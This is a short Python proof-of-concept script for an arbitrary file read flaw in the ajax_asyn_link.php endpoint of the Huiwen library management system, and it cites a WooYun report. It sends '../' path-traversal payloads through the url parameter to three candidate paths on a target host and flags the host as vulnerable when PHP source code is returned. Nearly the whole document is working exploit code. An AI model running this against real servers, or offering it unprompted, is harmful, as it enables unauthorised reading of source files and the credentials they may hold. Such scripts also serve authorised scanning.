#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 汇文软件图书管理系统ajax_asyn_link.php任意文件读取
referer: http://www.wooyun.org/bugs/wooyun-2010-067400
author: Lucifer
description: 漏洞影响3.5,4.0,5.0版本,漏洞文件位于ajax_asyn_link.php中,参数url可以传入"../"来读取PHP文件。
'''
import sys
import requests
import warnings
def run(url):
        result = ['汇文软件图书管理系统ajax_asyn_link.php任意文件读取','','']
        try:
            noexist = True
            for payload in [r"/zplug/ajax_asyn_link.php?url=../opac/search.php",
                            r"/opac/zplug/ajax_asyn_link.php?url=../opac/search.php",
                            r"/hwweb/zplug/ajax_asyn_link.php?url=../opac/search.php"]:
                vulnurl = url + payload

                req = requests.get(vulnurl, timeout=10, verify=False)
                if r"<?php" in req.text:
                    result[2]=  '存在'
                    result[1] = vulnurl
                    noexist = False
            if noexist:
                result[2]=  '不存在'
        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
